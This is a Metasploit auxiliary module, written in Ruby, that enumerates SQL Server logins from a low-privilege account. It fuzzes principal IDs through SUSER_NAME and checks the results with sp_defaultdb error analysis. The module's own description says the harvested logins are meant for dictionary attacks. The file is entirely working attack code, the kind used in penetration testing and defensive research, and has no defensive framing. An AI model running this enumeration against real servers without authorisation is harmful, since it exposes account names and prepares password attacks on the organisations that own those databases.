##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration',
      'Description' => %q{
        This module can be used to obtain a list of all logins from a SQL Server with any login.
        Selecting all of the logins from the master..syslogins table is restricted to sysadmins.
        However, logins with the PUBLIC role (everyone) can quickly enumerate all SQL Server
        logins using the SUSER_SNAME function by fuzzing the principal_id parameter. This is
        pretty simple, because the principal IDs assigned to logins are incremental.  Once logins
        have been enumerated they can be verified via sp_defaultdb error analysis. This is
        important, because not all of the principal IDs resolve to SQL logins (some resolve to
        roles instead). Once logins have been enumerated, they can be used in dictionary attacks.
      },
      'Author'      => ['nullbind <scott.sutherland[at]netspi.com>'],
      'License'     => MSF_LICENSE,
      'References'  => [['URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
    ))

    register_options(
      [
        OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 300]),
      ])
  end

  def run
    # Check connection and issue initial query
    print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
    if mssql_login_datastore
      print_good('Connected.')
    else
      print_error('Login was unsuccessful. Check your credentials.')
      disconnect
      return
    end

    # Query for sysadmin status
    print_status("Checking if #{datastore['USERNAME']} has the sysadmin role...")
    user_status = check_sysadmin

    # Check if user has sysadmin role
    if user_status == 1
      print_good("#{datastore['USERNAME']} is a sysadmin.")
    else
      print_status("#{datastore['USERNAME']} is NOT a sysadmin.")
    end

    # Get a list if sql server logins using SUSER_NAME()
    print_status("Setup to fuzz #{datastore['FuzzNum']} SQL Server logins.")
    print_status('Enumerating logins...')
    sql_logins_list = get_sql_logins
    if sql_logins_list.nil? || sql_logins_list.empty?
      print_error('Sorry, somethings went wrong - SQL Server logins were found.')
      disconnect
      return
    else
      # Print number of initial logins found
      print_good("#{sql_logins_list.length} initial SQL Server logins were found.")

      sql_logins_list.sort.each do |sql_login|
        if datastore['VERBOSE']
          print_status(" - #{sql_login}")
        end
      end
    end

    # Verify the enumerated SQL Logins using sp_defaultdb error ananlysis
    print_status('Verifying the SQL Server logins...')
    sql_logins_list_verified = verify_logins(sql_logins_list)
    if sql_logins_list_verified.nil?
      print_error('Sorry, no SQL Server logins could be verified.')
      disconnect
      return
    else

      # Display list verified SQL Server logins
      print_good("#{sql_logins_list_verified.length} SQL Server logins were verified:")
      sql_logins_list_verified.sort.each do |sql_login|
          print_status(" - #{sql_login}")
      end
    end

    disconnect
  end

  # Checks if user is a sysadmin
  def check_sysadmin
    # Setup query to check for sysadmin
    sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    status = parse_results[0][0]

    # Return status
    return status
  end

  # Gets trusted databases owned by sysadmins
  def get_sql_logins
    # Create array to store the sql logins
    sql_logins = []

    # Fuzz the principal_id parameter passed to the SUSER_NAME function
    (1..datastore['FuzzNum']).each do |principal_id|
      # Setup query
      sql = "SELECT SUSER_NAME(#{principal_id}) as login"

      # Execute query
      result = mssql_query(sql)

      # Parse results
      parse_results = result[:rows]
      sql_login = parse_results[0][0]

      # Add to sql server login list
      sql_logins.push(sql_login) unless sql_logins.include?(sql_login)
    end

    # Return list of logins
    sql_logins
  end

  # Checks if user has the db_owner role
  def verify_logins(sql_logins_list)

    # Create array for later use
    verified_sql_logins = []

    fake_db_name = Rex::Text.rand_text_alpha_upper(24)

    # Check if the user has the db_owner role is any databases
    sql_logins_list.each do |sql_login|
      # Setup query
      sql = "EXEC sp_defaultdb '#{sql_login}', '#{fake_db_name}'"

      # Execute query
      result = mssql_query(sql)

      # Parse results
      parse_results = result[:errors]
      result = parse_results[0]

      # Check if sid resolved to a sql login
      if result.include?(fake_db_name)
        verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)
      end

      # Check if sid resolved to a sql login
      if result.include?('alter the login')
        # Add sql server login to verified list
        verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)
      end
    end

    verified_sql_logins
  end
end
